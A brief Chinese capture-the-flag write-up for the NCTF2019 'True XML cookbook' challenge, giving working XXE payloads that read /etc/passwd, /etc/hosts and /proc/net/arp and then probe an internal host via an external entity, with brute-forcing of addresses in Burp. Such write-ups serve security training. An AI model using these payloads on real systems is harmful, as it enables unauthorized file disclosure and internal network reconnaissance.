# \[NCTF2019]True XML cookbook

## \[NCTF2019]True XML cookbook

## 考点



## wp

直接抓包进行XXE

```xml
<!DOCTYPE ANY [
    <!ENTITY test SYSTEM "file:///flag">
]>
<user><username>&test;</username><password>123</password></user>
```

提示加载失败，把文件换成`/etc/passwd`就成功加载了。再去读`/etc/hosts`

![](<../.gitbook/assets/image (24).png>)

再去读`/proc/net/arp`

![](<../.gitbook/assets/image (19) (1).png>)

看到内网有存活的主机，尝试访问，提示失败

```xml
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE note [
  <!ENTITY admin SYSTEM "http://169.254.1.1/">
  ]>
<user><username>&admin;</username><password>123546</password></user>
```

放在burp里面爆破一下最后一位地址即可
